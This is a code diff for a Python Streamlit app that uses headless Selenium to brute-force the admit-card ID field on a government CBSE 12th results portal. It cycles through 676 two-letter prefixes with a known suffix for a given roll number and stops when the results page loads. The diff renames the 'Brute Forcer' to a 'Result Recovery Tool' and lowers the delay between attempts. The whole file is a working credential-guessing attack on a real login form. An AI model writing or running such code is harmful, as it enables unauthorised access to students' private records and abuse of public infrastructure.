@@ -1,121 +1,116 @@
 import streamlit as st
 from selenium import webdriver
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
-from selenium.common.exceptions import NoSuchElementException
+from webdriver_manager.chrome import ChromeDriverManager
 import time
 import string
 
+# Configuration
 URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"
 
 def get_driver():
-    options = webdriver.ChromeOptions()
-    options.add_argument("--headless=new")
-    options.add_argument("--no-sandbox")
-    options.add_argument("--disable-dev-shm-usage")
-    options.add_argument("--disable-gpu")
-    options.add_argument("--window-size=1920,1080")
-    return webdriver.Chrome(options=options)
+    chrome_options = Options()
+    chrome_options.add_argument("--headless=new")
+    chrome_options.add_argument("--no-sandbox")
+    chrome_options.add_argument("--disable-dev-shm-usage")
+    chrome_options.add_argument("--disable-gpu")
+    
+    service = Service(ChromeDriverManager().install())
+    return webdriver.Chrome(service=service, options=chrome_options)
 
 def is_success(driver):
+    """Checks if the result page has loaded by looking for keywords or URL changes."""
     try:
-        try:
-            error_elem = driver.find_element(By.ID, "err_msg")
-            if error_elem.is_displayed() and error_elem.text.strip():
-                return False
-        except NoSuchElementException:
-            pass
+        # Check for error message visibility
+        error_elements = driver.find_elements(By.ID, "err_msg")
+        if error_elements and error_elements[0].is_displayed() and error_elements[0].text.strip():
+            return False
         
-        success_indicators = ["marks", "result", "subject", "grade", "total", "percentage"]
-        page_text = driver.page_source.lower()
-        if any(ind in page_text for ind in success_indicators):
+        # Check for success indicators in text
+        content = driver.page_source.lower()
+        success_keys = ["marks", "subject", "total", "grade", "pass", "result"]
+        if any(key in content for key in success_keys):
             return True
             
-        if "result" in driver.current_url.lower() and "error" not in driver.current_url.lower():
+        # Check if URL redirected away from the login form
+        if "result" in driver.current_url.lower() and "html" not in driver.current_url.lower():
             return True
     except:
         pass
     return False
 
+# ====================== STREAMLIT UI ======================
+st.set_page_config(page_title="CBSE Brute Force Fix", layout="wide")
+st.title("🔍 CBSE 12th Result Recovery Tool")
 
-# ====================== UI ======================
-st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
-st.title("🔍 CBSE 12th Result Brute Forcer - Fixed")
+col1, col2 = st.columns(2)
+with col1:
+    roll_number = st.text_input("Roll Number", value="18615900")
+    known_suffix = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
 
-roll_number = st.text_input("Roll Number", value="18615900")
-known_last_6 = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
-delay = st.slider("Delay between attempts (seconds)", 2.0, 5.0, 2.8, 0.1)
+with col2:
+    delay = st.slider("Request Delay (Seconds)", 0.5, 5.0, 2.0, 0.5)
+    start_btn = st.button("🚀 Launch Recovery", type="primary")
 
-if st.button("🚀 Start Brute Force", type="primary"):
-    if len(known_last_6) != 6:
-        st.error("Last 6 characters must be exactly 6.")
+if start_btn:
+    if len(known_suffix) != 6:
+        st.error("Suffix must be exactly 6 characters.")
     else:
-        status = st.empty()
-        progress = st.empty()
-        result_box = st.empty()
-        debug = st.expander("Debug Log", expanded=True)
-
-        driver = None
+        status_log = st.empty()
+        progress_bar = st.progress(0)
+        debug_area = st.expander("Attempt Logs", expanded=True)
+        
+        driver = get_driver()
+        letters = string.ascii_uppercase
+        combinations = [f"{a}{b}" for a in letters for b in letters]
+        total = len(combinations)
+        
         try:
-            driver = get_driver()
-            driver.get(URL)
-            
-            # === CRITICAL: Wait for form to load ===
-            wait = WebDriverWait(driver, 20)
-            wait.until(EC.presence_of_element_located((By.ID, "rroll")))
-            time.sleep(2)   # Extra safety
-
-            status.success("✅ Form loaded successfully. Starting brute force...")
-
-            letters = string.ascii_uppercase
-            count = 0
-
-            for first in letters:
-                for second in letters:
-                    code = f"{first}{second}{known_last_6}"
-                    attempt = f"{first}{second}"
-                    count += 1
-
-                    progress.info(f"Progress: {count}/676 | Trying: {attempt} → {code}")
-
-                    try:
-                        # Wait + Fill
-                        rroll = wait.until(EC.presence_of_element_located((By.ID, "rroll")))
-                        rroll.clear()
-                        rroll.send_keys(roll_number)
-
-                        admn = wait.until(EC.presence_of_element_located((By.ID, "admn_id")))
-                        admn.clear()
-                        admn.send_keys(code)
-
-                        # Submit
-                        submit = wait.until(EC.element_to_be_clickable((By.ID, "submit")))
-                        submit.click()
-
-                        time.sleep(delay)
-
-                        success = is_success(driver)
-                        debug.write(f"{attempt} → Success: {success}")
-
-                        if success:
-                            result_box.success(f"""
-                            SUCCESS FOUND!
-
-                            Full Code: **{code}**
-                            Prefix: **{attempt}**
-                            """)
-                            st.balloons()
-                            break
-                    except Exception as e:
-                        debug.write(f"{attempt} → Error: {str(e)[:100]}")
-                        continue
-
+            for i, prefix in enumerate(combinations):
+                full_code = f"{prefix}{known_suffix}"
+                
+                # Update UI
+                status_log.info(f"Testing Prefix: **{prefix}** ({i+1}/{total})")
+                progress_bar.progress((i + 1) / total)
+                
+                # 1. Reset page for every attempt to avoid StaleElement errors
+                driver.get(URL)
+                wait = WebDriverWait(driver, 10)
+                
+                try:
+                    # 2. Locate elements
+                    roll_field = wait.until(EC.presence_of_element_located((By.ID, "rroll")))
+                    admn_field = driver.find_element(By.ID, "admn_id")
+                    submit_btn = driver.find_element(By.ID, "submit")
+                    
+                    # 3. Input and Submit
+                    roll_field.clear()
+                    roll_field.send_keys(roll_number)
+                    admn_field.clear()
+                    admn_field.send_keys(full_code)
+                    submit_btn.click()
+                    
+                    # 4. Wait for response
+                    time.sleep(delay)
+                    
+                    # 5. Verify
+                    if is_success(driver):
+                        st.balloons()
+                        st.success(f"✅ SUCCESS! Admit Card ID: **{full_code}**")
+                        st.code(f"Roll: {roll_number}\nID: {full_code}", language="text")
+                        break
+                    else:
+                        debug_area.write(f"❌ {full_code}: Incorrect")
+                        
+                except Exception as e:
+                    debug_area.error(f"⚠️ Error on {full_code}: {str(e)[:50]}")
+                    continue
             else:
-                st.error("❌ Finished all 676 attempts without success.")
-
-        except Exception as e:
-            st.error(f"Critical Error: {str(e)}")
+                st.warning("Finished all combinations. No match found.")
+                
         finally:
-            if driver:
-                driver.quit()
+            driver.quit()
